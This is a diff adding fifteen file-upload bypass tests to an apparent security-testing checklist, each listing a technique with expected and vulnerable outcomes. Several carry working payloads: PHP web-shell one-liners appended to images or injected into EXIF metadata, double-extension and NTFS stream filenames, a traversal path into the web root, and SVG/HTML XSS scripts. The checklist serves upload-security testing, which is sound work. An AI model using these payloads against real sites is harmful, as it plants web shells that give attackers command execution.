@@ -2725,6 +2725,179 @@ For example in Git, the exploitation technique doesn't require to list the conte
 3. **Extension Verification Bypass**
    - Use double extensions (`shell.php.jpg`).
 
+**1. Extension Filter Bypass**  
+Upload executable file with double or spoofed extension.
+
+`filename`  
+```text
+shell.php.jpg
+shell.jpg.php
+shell.pHp
+```
+
+✅ Expected: Extension validated strictly  
+❌ Vulnerable: Executable file accepted
+
+---
+
+**2. MIME Type Bypass**  
+Spoof `Content-Type` header to bypass validation.
+
+`http`  
+Header:  
+```http
+Content-Type: image/png
+```
+
+✅ Expected: MIME type verified server-side  
+❌ Vulnerable: File accepted based on header alone
+
+---
+
+**3. Magic Bytes Bypass**  
+Embed shell after valid image header.
+
+`bash`  
+```bash
+echo "<?php system($_GET['cmd']); ?>" >> image.png
+```
+
+✅ Expected: File scanned for actual content  
+❌ Vulnerable: Shell executed despite image header
+
+---
+
+**4. Content-Disposition Manipulation**  
+Inject malicious filename via multipart upload.
+
+`http`  
+Header:  
+```http
+Content-Disposition: form-data; name="file"; filename="shell.php"
+```
+
+✅ Expected: Filename sanitized  
+❌ Vulnerable: Executable file saved
+
+---
+
+**5. NTFS ADS Bypass (Windows)**  
+Use alternate data stream to hide payload.
+
+`filename`  
+```text
+shell.asp:.jpg
+shell.asp::$data
+```
+
+✅ Expected: ADS rejected or ignored  
+❌ Vulnerable: Payload executed via ADS
+
+---
+
+**6. Filename Length Truncation**  
+Exploit filename length limits to hide extension.
+
+`filename`  
+```text
+A...A.php.png (255 bytes total)
+```
+
+✅ Expected: Full filename validated  
+❌ Vulnerable: Executable extension preserved
+
+---
+
+**7. Image Metadata Injection**  
+Embed shell in EXIF metadata.
+
+`bash`  
+```bash
+exiftool -Comment="<?php system($_GET['cmd']); ?>" image.jpg
+```
+
+✅ Expected: Metadata stripped or ignored  
+❌ Vulnerable: Shell executed from metadata
+
+---
+
+**8. Compression Bypass**  
+Upload compressed image with embedded shell.
+
+✅ Expected: File decompressed and scanned  
+❌ Vulnerable: Shell survives compression
+
+---
+
+**9. Resizing Bypass**  
+Upload image with shell in non-resized chunk (e.g. PLTE).
+
+✅ Expected: Image resized securely  
+❌ Vulnerable: Shell chunk preserved
+
+---
+
+**10. File Path Traversal via Filename**  
+Inject traversal sequences in filename.
+
+`filename`  
+```text
+../../../../var/www/html/shell.php
+```
+
+✅ Expected: Path sanitized  
+❌ Vulnerable: File written outside intended directory
+
+---
+
+**11. Client-Side Validation Only**  
+Rely on JavaScript to block `.php` uploads.
+
+✅ Expected: Server-side validation enforced  
+❌ Vulnerable: JS bypassed, file accepted
+
+---
+
+**12. Upload Location Disclosure**  
+Server reveals upload path in response.
+
+✅ Expected: Generic success message  
+❌ Vulnerable: Full path disclosed
+
+---
+
+**13. HTML/JS Upload for XSS**  
+Upload `.html` or `.js` file with script payload.
+
+`html`  
+```html
+<script>alert('XSS')</script>
+```
+
+✅ Expected: File served as download or blocked  
+❌ Vulnerable: Script executed in browser
+
+---
+
+**14. SVG Upload with JavaScript**  
+Embed JS in SVG file.
+
+`svg`  
+```xml
+<svg><script>alert('XSS')</script></svg>
+```
+
+✅ Expected: SVG sanitized or blocked  
+❌ Vulnerable: JS executed on render
+
+---
+
+**15. Polyglot File Upload**  
+Merge shell with valid file format (e.g. JPEG + PHP).
+
+✅ Expected: File parsed strictly  
+❌ Vulnerable: Executable code triggered
+
 ### Tool:
 - [FuzzDB Malicious Images](https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/file-upload/malicious-images)
 
